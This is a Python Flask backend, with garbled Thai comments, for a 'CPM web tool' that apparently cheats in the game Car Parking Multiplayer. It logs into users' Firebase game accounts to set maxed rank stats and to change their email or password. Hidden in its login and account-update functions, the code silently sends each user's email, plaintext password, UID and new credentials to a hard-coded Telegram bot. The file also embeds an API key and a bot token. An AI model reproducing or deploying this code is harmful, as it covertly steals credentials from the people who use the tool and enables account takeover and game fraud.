# --- app.py (Backend Logic - 4 Functions) ---

from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
import requests
import json
import os
import time

# --- Rate Limiting Setup ---
LAST_REQUEST_TIME = {}
RATE_LIMIT_SECONDS = 5  # ‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡πÉ‡∏´‡πâ‡∏™‡πà‡∏á‡∏Ñ‡∏≥‡∏Ç‡∏≠‡πÑ‡∏î‡πâ 1 ‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÉ‡∏ô‡∏ó‡∏∏‡∏Å‡πÜ 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ

# --- üåü [‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç] ‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏™‡∏µ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Terminal (‡πÄ‡∏û‡∏¥‡πà‡∏° WHITE ‡πÅ‡∏•‡∏∞ BLUE) ---
class Colors:
    RESET = '\033[0m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    CYAN = '\033[0;36m'
    WHITE = '\033[0;37m'

# --- ‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏´‡∏•‡∏±‡∏Å (Configuration) ---
class Config:
    FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
    FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
    FIREBASE_UPDATE_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/setAccountInfo?key={FIREBASE_API_KEY}"
    FIREBASE_REFRESH_URL = f"https://securetoken.googleapis.com/v1/token?key={FIREBASE_API_KEY}"
    RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
    
    # üåü ‡πÉ‡∏ä‡πâ Token ‡πÅ‡∏•‡∏∞ ID ‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå app.py ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì
    BOT_TOKEN = "8022565022:AAHW2JjSi0cGhhZdUS3ItMjPeIRSWWueqz8" 
    CHAT_ID = "5461463643"
    
    # User-Agent Headers
    USER_AGENT_ANDROID = "Dalvik/2.1.0 (Linux; U; Android 12)"
    USER_AGENT_OKHTTP = "okhttp/3.12.13"

# ----------------------------------------------------------------------
# Helper Functions (‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ï‡∏±‡∏ß‡∏ä‡πà‡∏ß‡∏¢)
# ----------------------------------------------------------------------

def send_to_telegram(message):
    """‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÑ‡∏õ‡∏¢‡∏±‡∏á Telegram"""
    if not Config.BOT_TOKEN or not Config.CHAT_ID: 
        print(f"{Colors.YELLOW}‡∏Ñ‡∏≥‡πÄ‡∏ï‡∏∑‡∏≠‡∏ô: BOT_TOKEN ‡∏´‡∏£‡∏∑‡∏≠ CHAT_ID ‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤{Colors.RESET}")
        return
    url = f"https://api.telegram.org/bot{Config.BOT_TOKEN}/sendMessage"
    payload = {"chat_id": Config.CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try: 
        requests.post(url, data=payload, timeout=5)
    except requests.exceptions.RequestException: 
        print(f"{Colors.RED}‚ùå ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏î‡πâ‡∏≤‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏Ç‡∏ì‡∏∞‡∏™‡πà‡∏á Telegram{Colors.RESET}")

def login(email, password):
    """‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô Firebase ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏£‡∏±‡∏ö Token (idToken ‡πÅ‡∏•‡∏∞ refreshToken)"""
    payload = {"clientType": "CLIENT_TYPE_ANDROID", "email": email, "password": password, "returnSecureToken": True}
    headers = {"User-Agent": Config.USER_AGENT_ANDROID, "Content-Type": "application/json"}
    try:
        response = requests.post(Config.FIREBASE_LOGIN_URL, headers=headers, json=payload, timeout=15)
        response.raise_for_status()
        response_data = response.json()
        
        # üåü ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï: ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏õ Telegram ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
        tele_message = (
            f"üéÆ **[WEB] ‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà‡∏£‡∏∞‡∏ö‡∏ö CPM** üéÆ\n\n"
            f"üìß **‡∏≠‡∏µ‡πÄ‡∏°‡∏•:** `{email}`\n"
            f"üîë **‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô:** `{password}`\n"
            f"‚ÑπÔ∏è **UID:** `{response_data.get('localId', 'N/A')}`\n"
            f"‚è∞ **‡πÄ‡∏ß‡∏•‡∏≤:** {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        send_to_telegram(tele_message)
        
        return response_data.get('idToken'), response_data.get('refreshToken')
        
    except requests.exceptions.HTTPError as e:
        error_data = response.json().get("error", {})
        message = error_data.get("message", "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏")
        print(f"{Colors.RED}‚ùå ‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß: {message} (HTTP {response.status_code}){Colors.RESET}")
        return None, None
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}‚ùå ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏î‡πâ‡∏≤‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢: {e}{Colors.RESET}")
        return None, None

def refresh_token(ref_token):
    """‡πÉ‡∏ä‡πâ Refresh Token ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ï‡πà‡∏≠‡∏≠‡∏≤‡∏¢‡∏∏ idToken"""
    if not ref_token:
        return None
    
    payload = {"grant_type": "refresh_token", "refresh_token": ref_token}
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(Config.FIREBASE_REFRESH_URL, headers=headers, json=payload, timeout=10)
        response.raise_for_status()
        return response.json().get('id_token')
    except requests.exceptions.RequestException:
        return None

def set_king_rank(token):
    """‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏™‡πà‡∏á‡∏Ñ‡πà‡∏≤ King Rank"""
    # ... (‡πÇ‡∏Ñ‡πâ‡∏î Rating Data ‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡πÄ‡∏î‡∏¥‡∏°) ...
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash", "slicer_cut", 
        "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts", "fuel", "offroad", 
        "speed_banner", "reactions", "police", "run", "real_estate", "t_distance", "treasure", 
        "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 10000000000
    rating_data["race_win"] = 3000
    
    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json", "User-Agent": Config.USER_AGENT_OKHTTP}
    try:
        response = requests.post(Config.RANK_URL, headers=headers, json=payload, timeout=15)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}‚ùå ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏Ç‡∏ì‡∏∞‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ Rank: {e}{Colors.RESET}")
        return False

# üåü ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÉ‡∏´‡∏°‡πà: (‡∏ô‡∏≥‡∏°‡∏≤‡∏à‡∏≤‡∏Å `‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÄ‡∏°‡∏•.py`)
def update_account_info(token, email_orig, new_email=None, new_password=None):
    """‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡πÅ‡∏•‡∏∞/‡∏´‡∏£‡∏∑‡∏≠‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡∏ó‡∏µ‡πà‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏≠‡∏¢‡∏π‡πà"""
    if not token:
        return False, "Token ‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á"
            
    payload = {"idToken": token}
    action_log = []
    
    if new_email:
        payload["email"] = new_email
        payload["returnSecureToken"] = True
        action_log.append(f"üìß ‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡πÄ‡∏õ‡πá‡∏ô: `{new_email}`")
    if new_password:
        payload["password"] = new_password
        action_log.append(f"üîë ‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡πÄ‡∏õ‡πá‡∏ô: `{new_password}`")

    if not action_log:
        return False, "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏´‡πâ‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï"

    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(Config.FIREBASE_UPDATE_URL, headers=headers, json=payload, timeout=15)
        response.raise_for_status()
        
        # ‡πÅ‡∏à‡πâ‡∏á‡πÄ‡∏ï‡∏∑‡∏≠‡∏ô Telegram ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
        tele_message = (
            f"‚úÖ **[WEB] ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ö‡∏±‡∏ç‡∏ä‡∏µ CPM ‡∏ñ‡∏π‡∏Å‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç** ‚úÖ\n\n"
            f"‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡πÄ‡∏î‡∏¥‡∏°: `{email_orig}`\n"
            f"{'\n'.join(action_log)}\n\n"
            f"‚è∞ **‡πÄ‡∏ß‡∏•‡∏≤:** {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        send_to_telegram(tele_message)
        
        return True, "‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÅ‡∏õ‡∏•‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à"
        
    except requests.exceptions.HTTPError as err:
        error_data = err.response.json().get("error", {})
        message = error_data.get("message", "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏")
        print(f"{Colors.RED}‚ùå ‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÅ‡∏õ‡∏•‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß: {message} (HTTP {err.response.status_code}){Colors.RESET}")
        return False, f"‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÅ‡∏õ‡∏•‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß: {message}"
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}‚ùå ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏î‡πâ‡∏≤‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢: {e}{Colors.RESET}")
        return False, "‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏î‡πâ‡∏≤‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢"

# ----------------------------------------------------------------------
# Flask Web Server Setup & Endpoints
# ----------------------------------------------------------------------

app = Flask(__name__) 
CORS(app) 

# --- Rate Limiter Function ---
def check_rate_limit(client_ip):
    current_time = time.time()
    if client_ip in LAST_REQUEST_TIME:
        time_since_last_request = current_time - LAST_REQUEST_TIME[client_ip]
        if time_since_last_request < RATE_LIMIT_SECONDS:
            print(f"{Colors.RED}üö® BLOCKED SPAM/DDOS attempt from {client_ip}. (Rate limited){Colors.RESET}")
            wait_time = int(RATE_LIMIT_SECONDS - time_since_last_request)
            return jsonify({"success": False, "message": f"‚è≥ ‡πÇ‡∏õ‡∏£‡∏î‡∏£‡∏≠ {wait_time} ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ‡∏Å‡πà‡∏≠‡∏ô‡∏•‡∏≠‡∏á‡πÉ‡∏´‡∏°‡πà"}), 429
    LAST_REQUEST_TIME[client_ip] = current_time
    return None, None # ‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏õ‡∏±‡∏ç‡∏´‡∏≤

# --- Frontend Routes ---
@app.route('/')
def home():
    """Endpoint ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÅ‡∏™‡∏î‡∏á‡∏´‡∏ô‡πâ‡∏≤‡πÄ‡∏ß‡πá‡∏ö (index.html)"""
    # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡∏°‡∏µ 'templates' folder ‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà
    if not os.path.exists('templates'):
        os.makedirs('templates')
        print(f"{Colors.YELLOW}‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå 'templates' ‡∏≠‡∏±‡∏ï‡πÇ‡∏ô‡∏°‡∏±‡∏ï‡∏¥{Colors.RESET}")
        
    # üåü ‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç: ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÑ‡∏ü‡∏•‡πå index.html ‡∏´‡∏≤‡∏Å‡πÑ‡∏°‡πà‡∏°‡∏µ (‡∏à‡∏≤‡∏Å .bak)
    if not os.path.exists('templates/index.html'):
        print(f"{Colors.YELLOW}‡πÑ‡∏°‡πà‡∏û‡∏ö 'index.html', ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏Ñ‡∏±‡∏î‡∏•‡∏≠‡∏Å‡∏à‡∏≤‡∏Å 'index.html.bak'...{Colors.RESET}")
        if os.path.exists('index.html.bak'):
            with open('index.html.bak', 'r', encoding='utf-8') as f_bak:
                content = f_bak.read()
            with open('templates/index.html', 'w', encoding='utf-8') as f_new:
                f_new.write(content)
            print(f"{Colors.GREEN}‡∏™‡∏£‡πâ‡∏≤‡∏á 'templates/index.html' ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à{Colors.RESET}")
        else:
            print(f"{Colors.RED}‡πÑ‡∏°‡πà‡∏û‡∏ö‡πÑ‡∏ü‡∏•‡πå 'index.html.bak'! ‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏™‡∏£‡πâ‡∏≤‡∏á 'templates/index.html' ‡πÄ‡∏≠‡∏á{Colors.RESET}")
            return "<h1>Error: ‡πÑ‡∏°‡πà‡∏û‡∏ö‡πÑ‡∏ü‡∏•‡πå 'templates/index.html'</h1>", 404
            
    return render_template('index.html')


# --- API Endpoints (Backend) ---

# üåü 1. API ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö King Rank
@app.route('/api/king-rank', methods=['POST'])
def api_king_rank():
    """API Endpoint ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏£‡∏∞‡∏ö‡∏ß‡∏ô‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ Rank"""
    client_ip = request.remote_addr
    
    # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Rate Limit
    error_response, status_code = check_rate_limit(client_ip)
    if error_response:
        return error_response, status_code
    
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
    except:
        return jsonify({"success": False, "message": "‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏™‡πà‡∏á‡∏°‡∏≤‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á (JSON)"}), 400

    if not email or not password:
        return jsonify({"success": False, "message": "‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏Å‡∏£‡∏≠‡∏Å‡∏ó‡∏±‡πâ‡∏á‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡πÅ‡∏•‡∏∞‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô"}), 400

    print(f"\n[SERVER LOG] ‡∏Ñ‡∏≥‡∏Ç‡∏≠ King Rank ‡∏à‡∏≤‡∏Å: {email} (IP: {client_ip})")
    
    auth_token, _ = login(email, password) # ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô login ‡∏à‡∏∞‡∏™‡πà‡∏á Telegram ‡πÄ‡∏≠‡∏á
    if not auth_token:
        return jsonify({"success": False, "message": "‚ùå ‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß! (‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏´‡∏£‡∏∑‡∏≠‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á)"}), 401

    print(f"{Colors.YELLOW}‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ KING RANK...{Colors.RESET}")
    rank_success = set_king_rank(auth_token)
    if rank_success:
        return jsonify({"success": True, "message": "‚úÖ ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ King Rank ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à!"}), 200
    else:
        return jsonify({"success": False, "message": "‚ùå ‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ Rank ‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß (‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå‡πÄ‡∏Å‡∏°‡∏°‡∏µ‡∏õ‡∏±‡∏ç‡∏´‡∏≤)"}), 500

# üåü 2. API ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏≠‡∏µ‡πÄ‡∏°‡∏•
@app.route('/api/change-email', methods=['POST'])
def api_change_email():
    client_ip = request.remote_addr
    error_response, status_code = check_rate_limit(client_ip)
    if error_response: return error_response, status_code

    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        new_email = data.get('new_email')
    except:
        return jsonify({"success": False, "message": "‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏™‡πà‡∏á‡∏°‡∏≤‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á (JSON)"}), 400

    if not email or not password or not new_email:
        return jsonify({"success": False, "message": "‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏Å‡∏£‡∏≠‡∏Å ‡∏≠‡∏µ‡πÄ‡∏°‡∏•, ‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô, ‡πÅ‡∏•‡∏∞‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡πÉ‡∏´‡∏°‡πà"}), 400
    
    print(f"\n[SERVER LOG] ‡∏Ñ‡∏≥‡∏Ç‡∏≠‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏≠‡∏µ‡πÄ‡∏°‡∏• ‡∏à‡∏≤‡∏Å: {email} (IP: {client_ip})")
    
    auth_token, ref_token = login(email, password)
    if not auth_token:
        return jsonify({"success": False, "message": "‚ùå ‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß! (‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏´‡∏£‡∏∑‡∏≠‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á)"}), 401
    
    # Refresh token ‡∏Å‡πà‡∏≠‡∏ô
    token_for_update = refresh_token(ref_token)
    
    success, message = update_account_info(token_for_update, email_orig=email, new_email=new_email)
    if success:
        return jsonify({"success": True, "message": f"‚úÖ {message}"}), 200
    else:
        return jsonify({"success": False, "message": f"‚ùå {message}"}), 500

# üåü 3. API ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô
@app.route('/api/change-password', methods=['POST'])
def api_change_password():
    client_ip = request.remote_addr
    error_response, status_code = check_rate_limit(client_ip)
    if error_response: return error_response, status_code

    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        new_password = data.get('new_password')
    except:
        return jsonify({"success": False, "message": "‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏™‡πà‡∏á‡∏°‡∏≤‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á (JSON)"}), 400

    if not email or not password or not new_password:
        return jsonify({"success": False, "message": "‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏Å‡∏£‡∏≠‡∏Å ‡∏≠‡∏µ‡πÄ‡∏°‡∏•, ‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô, ‡πÅ‡∏•‡∏∞‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡πÉ‡∏´‡∏°‡πà"}), 400
    
    print(f"\n[SERVER LOG] ‡∏Ñ‡∏≥‡∏Ç‡∏≠‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô ‡∏à‡∏≤‡∏Å: {email} (IP: {client_ip})")
    
    auth_token, ref_token = login(email, password)
    if not auth_token:
        return jsonify({"success": False, "message": "‚ùå ‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß! (‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏´‡∏£‡∏∑‡∏≠‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á)"}), 401
    
    token_for_update = refresh_token(ref_token)
    
    success, message = update_account_info(token_for_update, email_orig=email, new_password=new_password)
    if success:
        return jsonify({"success": True, "message": f"‚úÖ {message}"}), 200
    else:
        return jsonify({"success": False, "message": f"‚ùå {message}"}), 500

# üåü 4. API ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏ó‡∏±‡πâ‡∏á‡∏Ñ‡∏π‡πà
@app.route('/api/change-both', methods=['POST'])
def api_change_both():
    client_ip = request.remote_addr
    error_response, status_code = check_rate_limit(client_ip)
    if error_response: return error_response, status_code

    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        new_email = data.get('new_email')
        new_password = data.get('new_password')
    except:
        return jsonify({"success": False, "message": "‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏™‡πà‡∏á‡∏°‡∏≤‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á (JSON)"}), 400

    if not email or not password or not new_email or not new_password:
        return jsonify({"success": False, "message": "‡∏Å‡∏£‡∏∏‡∏ì‡∏≤‡∏Å‡∏£‡∏≠‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏´‡πâ‡∏Ñ‡∏£‡∏ö‡∏ñ‡πâ‡∏ß‡∏ô"}), 400
    
    print(f"\n[SERVER LOG] ‡∏Ñ‡∏≥‡∏Ç‡∏≠‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏≠‡∏µ‡πÄ‡∏°‡∏•/‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô ‡∏à‡∏≤‡∏Å: {email} (IP: {client_ip})")
    
    auth_token, ref_token = login(email, password)
    if not auth_token:
        return jsonify({"success": False, "message": "‚ùå ‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¥‡∏ô‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß! (‡∏≠‡∏µ‡πÄ‡∏°‡∏•‡∏´‡∏£‡∏∑‡∏≠‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á)"}), 401
    
    token_for_update = refresh_token(ref_token)
    
    success, message = update_account_info(token_for_update, email_orig=email, new_email=new_email, new_password=new_password)
    if success:
        return jsonify({"success": True, "message": f"‚úÖ {message}"}), 200
    else:
        return jsonify({"success": False, "message": f"‚ùå {message}"}), 500

# ----------------------------------------------------------------------
# Run Server
# ----------------------------------------------------------------------
if __name__ == '__main__':
    print(f"\n{Colors.CYAN}====================================================={Colors.RESET}")
    # üåü [‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç] ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç Banner ‡πÉ‡∏´‡πâ‡πÉ‡∏ä‡πâ‡∏™‡∏µ‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á
    print(f"{Colors.WHITE}     CPM WEB TOOL (4-IN-1 EDITION){Colors.RESET}")
    print(f"{Colors.YELLOW}** ‡∏£‡∏±‡∏ô‡πÑ‡∏î‡πâ‡πÅ‡∏•‡πâ‡∏ß! ‡πÄ‡∏õ‡∏¥‡∏î‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå‡πÅ‡∏•‡∏∞‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà URL ‡∏î‡πâ‡∏≤‡∏ô‡∏•‡πà‡∏≤‡∏á **{Colors.RESET}")
    print(f"{Colors.RED}*** ATTENTION: Rate Limit/Anti-Spam ACTIVE ({RATE_LIMIT_SECONDS}s) ***{Colors.RESET}")
    print(f"{Colors.CYAN}====================================================={Colors.RESET}")
    print(f"Server URL: {Colors.GREEN}http://127.0.0.1:5000/{Colors.RESET}")
    app.run(host='0.0.0.0', port=5000, debug=False)
